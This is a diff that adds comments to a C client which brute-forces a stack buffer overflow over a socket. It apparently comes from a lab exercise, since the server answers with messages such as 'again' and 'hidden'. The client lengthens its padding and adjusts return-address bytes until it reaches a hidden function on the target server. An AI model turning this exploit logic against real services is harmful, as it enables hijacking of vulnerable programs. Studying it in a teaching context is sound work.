@@ -8,8 +8,12 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
+// number of bytes of memory address to find
 #define MAGICNUMBER 4
+// length of attack string (padding + return address)
+// may require tuning depending on OS
 #define MINIMUM 24
+// whether to print out debug information
 #define DEBUG 0
 
 int main(int argc, char* argv[]) {
@@ -20,6 +24,8 @@ int main(int argc, char* argv[]) {
   int count = 1, i, j = 0, offset, sockfd, portno = 54321, n, closingIn = 0,
       *yes, number, segfault = 0, correct = 0, requests = 0, again = 0;
 
+    // standard socket programing: open socket to address and port
+    // zero out the buffer that will be used and connect
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
     if (sockfd < 0) {
@@ -42,7 +48,7 @@ int main(int argc, char* argv[]) {
     }
 
   while (1) {
-    bzero(buffer, 256);
+    bzero(buffer, 256); // zero out the buffer
     if (argc == 2) {
       count = 0;
       for (i = 0; argv[1][i] != ' '; i++) {
@@ -62,21 +68,23 @@ int main(int argc, char* argv[]) {
         atkStr[j] = number;
       }
       argc = 0;
-    }
+    } // legacy code to generate inital attack string
     sprintf((char*) buffer, "%d ", count);
     offset = (strchr((char*) buffer, ' ') - (char*) buffer) + 1;
     for (i = 0; i < count; i++) {
       buffer[offset + i] = atkStr[i];
     }
     n = write(sockfd, buffer, offset + count);
+    // write buffer to socket
     if (n < 0) {
       perror("ERROR writing to socket");
       close(sockfd);
       exit(0);
     }
-    requests++;
+    requests++; // keep track of the number of attempts
     bzero(buffer, 256);
     n = read(sockfd, buffer, 255);
+    // zero out buffer and read response from server
     if (n < 0) {
       perror("ERROR reading from socket");
       close(sockfd);
@@ -86,13 +94,19 @@ int main(int argc, char* argv[]) {
       printf("%s\n", buffer);
     }
     if (strstr((char*) buffer, "inished") > 0) {
+      // if the server responds that the operation finished successfully
       if (segfault) {
+        // if the client guessed multiple values for this byte
+        // it may indicate that the current byte is part of a memory address
         correct++;
         segfault = 0;
       } else {
+        // otherwise, the return address is not at this location
         correct = 0;
       }
       if (count >= MINIMUM) {
+        // when the attack string is long enough,
+        // start closing in on the hidden function
         closingIn = 1;
       }
       if (closingIn || (correct >= MAGICNUMBER)) {
@@ -103,24 +117,32 @@ int main(int argc, char* argv[]) {
           }
           printf("\n");
         }
+        // if closing in on hidden function, decrement the
+        // least significant byte of the return address
         if (count >= MINIMUM) {
           atkStr[count - MAGICNUMBER] = atkStr[count - MAGICNUMBER] - 1;
           closingIn = 1;
         } else {
+          // otherwise, add another byte to the attack string
+          atkStr[count] = 0;
           count++;
-          atkStr[i++] = 0;
         }
       } else {
+        // otherwise, add another byte to the attack string
         atkStr[count] = 0;
         count++;
       }
     } else if (strstr((char*) buffer, "gain") > 0) {
+      // server requests that client resend the previous string
       if (again > 5) {
+        // if client receives again response more than 5 times, change string
         if (closingIn) {
+          // if closing in, increment least significant byte and handle "overflow"
           if (0 == atkStr[count - MAGICNUMBER]) {
             if (0 == atkStr[count - (MAGICNUMBER - 1)]) {
               if (atkStr[count - (MAGICNUMBER - 2)] == 0) {
-                correct++;
+                correct++; // incremet number of correct (does this matter?)
+                // because this byte is no longer zero
               }
               atkStr[count - (MAGICNUMBER - 2)] = atkStr[count - (MAGICNUMBER - 2)] + 1;
             }
@@ -131,13 +153,18 @@ int main(int argc, char* argv[]) {
           }
           atkStr[count - MAGICNUMBER] = atkStr[count - MAGICNUMBER] + 1;
         } else {
+          // if not closing in, just increment last byte of the string
           atkStr[count - 1] = atkStr[count - 1] + 1;
         }
-        again = 0;
+        again = 0; // reset the again counter
       } else {
+        // otherwise, update the again counter
         again++;
       }
     } else if (strstr((char*) buffer, "idden") > 0) {
+      // if the hidden function is accessed,
+      // print out the return address in binary
+
 /*
       printf("\bAttack String: ");
       for (i = 0; i < count; i++) {
@@ -157,6 +184,8 @@ int main(int argc, char* argv[]) {
       close(sockfd);
       return 0;
     } else {
+      // for any other signal, consider it a segfault
+      // and modify the attack string as usual
       segfault = 1;
       if (closingIn == 1) {
         if (0 == atkStr[count - MAGICNUMBER]) {
@@ -181,13 +210,6 @@ int main(int argc, char* argv[]) {
         atkStr[count - 1] = atkStr[count - 1] + 1;
       }
     }
-    if (DEBUG) {
-      printf("\r%d ", count);
-      for (i = 0; i < count; i++) {
-        printf("[%u]", atkStr[i]);
-      }
-      printf("\n");
-    }
 
     if (DEBUG) {
       if (0 == atkStr[count]) {
@@ -197,10 +219,10 @@ int main(int argc, char* argv[]) {
           j = 0;
         }
       }
-    }
+    } // print a character indicating that progress is being made
     usleep(800);
   } // loop forever
   printf("done\n");
-  close(sockfd);
+  close(sockfd); // close the connection to the server
   return 0;
 } // main()
